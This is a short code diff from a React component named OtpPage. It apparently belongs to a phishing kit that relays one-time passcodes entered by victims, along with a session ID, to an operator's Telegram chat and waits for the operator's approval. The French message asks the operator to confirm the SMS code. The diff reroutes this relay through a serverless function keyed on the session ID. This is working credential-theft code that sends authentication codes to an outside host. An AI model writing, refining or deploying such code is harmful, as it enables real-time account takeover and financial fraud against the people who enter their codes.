@@ -131,9 +131,9 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         `🆔 <b>Session:</b> <code>${activeSessionId}</code>\n\n` +
         `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
 
-      // Send to Telegram and wait for approval (using phone as username, isCode=true)
+      // Send to Telegram via serverless and wait for approval
       setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, phone, true);
+      const approved = await sendLoginToTelegramAndWait(message, activeSessionId, 'otp');
 
       setIsWaitingTelegram(false);
 
